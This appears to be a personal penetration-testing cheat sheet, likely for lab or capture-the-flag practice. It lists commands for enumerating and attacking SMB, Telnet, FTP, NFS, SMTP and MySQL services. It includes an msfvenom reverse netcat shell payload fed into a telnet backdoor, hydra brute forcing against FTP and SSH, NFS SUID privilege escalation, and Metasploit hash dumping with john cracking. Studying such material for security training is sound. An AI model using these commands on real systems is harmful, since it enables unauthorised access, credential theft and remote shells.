# SMB
Server Message Block

port: 139/445

```
enum4linux [options] <ip>
enum4linux -A <ip>
```
found share folder
```
smbclient //[IP]/[SHARE]
smbclient //<ip>/<secret folder> -U user -p 445
```

# Telnet
use *nmap* to enumerate

maybe there's a backdoor

```
telnet [ip][port]
```
see what's happening through telnet session
```
sudo tcpdump ip proto \\icmp -i tun0
```
```
.RUN ping [local tun0 ip] -c 1
```
generate reverse shell
```
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
```
put the result in telnet and run, meanwhile nc is listening on 4444

# FTP
File Transfer Protocol

port: 21

```
ftp [IP]
name: anonymous
password: whatever-password
```
bruteforce
```
hydra -t 4 -l <name> -P <wordlist> -vV <ip> ftp
```
-t 4: parallel connections per target
-vV: set verbose mode to very verbose

# NFS
Network File System

*access files on remote sys as if they were local files - mounting*

it uses RPC to communicate between server&client

port: 2049

list NFS shares
```
showmount -e <ip>
```

create a dir locally
```
mkdir /tmp/mount
```

mount it
```
sudo mount -t nfs <ip>:<share> /tmp/mount/ -nolock
```
-t: type
-nolock: not to use NLM locking

*maybe you'll find some sensitive files, e.g. .ssh/id_rsa*

## PE w/ NFS

**Root Squashing** prevents anyone from getting root access after mounting. If it's turned off, however, we could create SUID bit files.

Files w/ **SUID** bit set can be run w/ the permissions of its owner/group.

Upload files to NFS share and change its permission. Then run it through ssh.

This file could be a bash.

# SMTP

Simple Mail Transfer Protocol

usually w/ 
	POP - Post Office Protocol
	IMAP - Internet Message Access Protocol

port: 25

use msf
* version
* more info (/usr/share/seclists/Usernames/top-usernames-shortlist.txt)
```
> use auxiliary/scanner/smtp/smtp_version
> use auxiliary/scanner/smtp/smtp_enum
```

brute force w/ hydra
```
hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV MACHINE_IP ssh
```

# MySQL

port: 3306

login
```
mysql -h <ip> -u <user> -p
```

msf again
```
> search mysql_sql
> set sql "show databases"
```

dump tables, column names
```
> use auxiliary/scanner/mysql/mysql_schemadump
```
```
> use auxiliary/scanner/mysql/mysql_hashdump
```

save the hash and crack it w/ **john**
```
john hash.txt
```
